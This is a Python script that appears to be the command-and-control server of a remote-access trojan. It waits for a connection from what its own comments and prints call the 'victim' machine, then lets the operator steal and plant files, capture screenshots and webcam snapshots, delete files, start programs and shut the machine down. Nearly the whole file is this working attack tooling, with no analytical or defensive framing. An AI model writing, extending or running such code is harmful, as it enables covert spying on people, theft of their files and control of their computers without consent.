import socket
import os
import time

from colorama import Fore, init

init(autoreset=True)


def get_local_ip():
    local_ip = socket.gethostbyname(socket.gethostname())
    return local_ip


def change_file_extension(file_path, new_extension):
    # Разделяем путь к файлу и его расширение
    file_name, _ = os.path.splitext(file_path)

    # Собираем новое имя файла с новым расширением
    new_file_path = file_name + new_extension

    try:
        # Переименовываем файл
        os.rename(file_path, new_file_path)
        print(f"Расширение файла изменено на {new_extension}")
    except Exception as e:
        print(f"Произошла ошибка при изменении расширения файла: {e}")


def download():
    connection.send(operation.encode())
    answer = connection.recv(1024)
    print(answer.decode())
    name_file = input(f"Chosen operation is {operation}! Enter name file or path to him : ")
    connection.send(name_file.encode())
    chosen_file = connection.recv(1024).decode()

    if chosen_file == "Entered file exist!":
        print("Entered file exist! Starting operation...")
        file_size = connection.recv(2048)
        file_size = int(file_size.decode())
        print(f"Size for chosen file is : {file_size}")
        with open("Downloaded_file.png", mode='wb') as file:
            data = connection.recv(file_size)
            file.write(data)

        extension = connection.recv(1024).decode()
        change_file_extension("Downloaded_file.png", extension)

        print("Operating was successful !")
    else:
        print("Entered file does not exist! Operating was stopped")


def upload():
    connection.send(operation.encode())

    file_name = input(f"Chosen operation is {operation}! Enter path or name for chosen file : ")
    if os.path.isfile(file_name):

        result_of_checking = "Entered file exist!"
        print(result_of_checking)
        connection.send(result_of_checking.encode())

        file_size_int = os.path.getsize(file_name)
        file_size_str = str(file_size_int)
        connection.send(file_size_str.encode())
        with open(file_name, mode='rb') as file:
            data = file.read(file_size_int)
            connection.send(data)

        move_to_directory = input("Enter directory to which do you want to move file - ")
        connection.send(move_to_directory.encode())
        new_name_file = input("Enter new name for file - ")
        connection.send(new_name_file.encode())
        new_extension = input("Enter new extension - ")
        connection.send(new_extension.encode())

        result = connection.recv(2048).decode()
        print(result)
    else:
        print("Entered file does not exist!")


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((get_local_ip(), 6969))
server.listen(1)

print(f"Server listen on address {get_local_ip()} on port '5555'")

connection, address = server.accept()
print(f"Server get connection on address : {address}")
operating_system = connection.recv(1024).decode()
print(f"Operating system for victim is : {Fore.RED}{operating_system}{Fore.RESET}")

# лист выводящий опции работы с жертвой
list_option = ("break", "work_with_file", "system_command")
option = ("Download", "Upload", "break", "screenshot", "snapshot", "remove", "start", "ls", "change_directory")
system_option = ("break", "power_off")


if "Windows" in operating_system:
    print(f"Start working witt operating system - {Fore.RED}{operating_system}{Fore.RESET}")
    while True:

        chosen_operation = input(f"{Fore.GREEN}Choose work! you can use : {Fore.RESET}{Fore.YELLOW}{list_option}{Fore.RESET} --- ")

        if chosen_operation == "work_with_file" or chosen_operation == "2" or chosen_operation == "w":

            current_directory = connection.recv(1024).decode()

            connection.send(chosen_operation.encode())
            while True:
                current_directory = connection.recv(1024).decode()
                print(f"You can use operation  - {Fore.YELLOW}{option}{Fore.RESET}")
                operation = input(f"{current_directory} : ")  # устанавливает в эту переменную текущую директорию}")

                if operation == "Download":
                    download()

                elif operation == "Upload":
                    upload()

                elif operation == "screenshot":
                    connection.send(operation.encode())
                    file_size = connection.recv(2048).decode()
                    with open("Made_screenshot.png", mode='wb')as file:
                        data = connection.recv(int(file_size))
                        file.write(data)
                    print("Screenshot was made!")

                elif operation == "snapshot":
                    connection.send(operation.encode())
                    result = connection.recv(1024).decode()
                    print(result)
                    if "Camera was opened" in result:
                        snapshot_size = connection.recv(1024).decode()
                        with open("../Made_snapshot.png", mode='wb')as file:
                            file.write(connection.recv(int(snapshot_size)))

                        print("Snapshot was made!")
                        print(connection.recv(1024).decode())

                    else:
                        print("Operation was stopped!")

                elif operation == "remove":
                    connection.send(operation.encode())
                    name_file = input(f"Enter path to file which you want to remove : ")
                    connection.send(name_file.encode())
                    result = connection.recv(1024).decode()
                    print(f"Result operation is : {Fore.BLUE}{result}{Fore.RESET}")

                elif operation == "start":
                    connection.send(operation.encode())
                    name_file = input("Enter path to file which you want to start : ")
                    connection.send(name_file.encode())
                    result = connection.recv(1024).decode()
                    print(f"Result for operation 'start' is : {Fore.BLUE}{result}{Fore.RESET}")

                elif operation == "break" or operation == "1" or operation == "o":
                    connection.send(operation.encode())
                    print(f"work - {Fore.YELLOW}work_with_file{Fore.RESET} - was finished!")
                    break

                elif operation == "ls":
                    connection.send(operation.encode())
                    size_of_result = int(connection.recv(1024))
                    print(connection.recv(size_of_result).decode())

                elif operation == "change_directory":
                    connection.send(operation.encode())
                    current_directory = connection.recv(1024).decode()
                    transition = input(f"Enter directory: {current_directory}: ")
                    connection.send(transition.encode())
                    print()

                else:
                    print(f"{Fore.RED}Such an operation as - {operation} - does not exist!!!{Fore.RESET}")

        elif chosen_operation == "system_command" or chosen_operation == "3" or chosen_operation == "s":
            current_directory = connection.recv(1024).decode()

            connection.send(chosen_operation.encode())
            while True:
                operation = input(f"Enter operation! you can use {Fore.YELLOW}{system_option}{Fore.RESET} - ")
                if operation == "power_off":
                    connection.send(operation.encode())
                    print(connection.recv(1024).decode())

                elif operation == "break":
                    connection.send(operation.encode())
                    break

                else:
                    print(f"{Fore.RED}Unknown command{Fore.RESET}")

        elif chosen_operation == "break":
            connection.send("break".encode())
            time.sleep(0.2)
            connection.close()
            server.close()
            break

        else:
            print(f"{Fore.RED}Such an operation as --{chosen_operation}-- does not exist!!!{Fore.RESET}")

















elif "Linux" in operating_system:
    print(f"Start working witt operating system - {Fore.RED}{operating_system}{Fore.RESET}")
    while True:
        print("Linux")

elif "MacOS" in operating_system:
    print(f"Start working witt operating system - {Fore.RED}{operating_system}{Fore.RESET}")
    while True:
        print("MacOS")







































































































































'''
import socket
import os
from colorama import Fore, Style, init

# Инициализация colorama (вызывается один раз в начале программы)
init(autoreset=True)


def get_local_ip():
    local_ip = socket.gethostbyname(socket.gethostname())
    return local_ip


def change_file_extension_on_server(file_path, new_extension):
    # Разделяем путь к файлу и его расширение
    file_name, _ = os.path.splitext(file_path)

    # Собираем новое имя файла с новым расширением
    new_file_path = file_name + new_extension

    try:
        # Переименовываем файл
        os.rename(file_path, new_file_path)
        print(f"Расширение файла изменено на {new_extension}")
    except Exception as e:
        print(f"Произошла ошибка при изменении расширения файла: {e}")
'''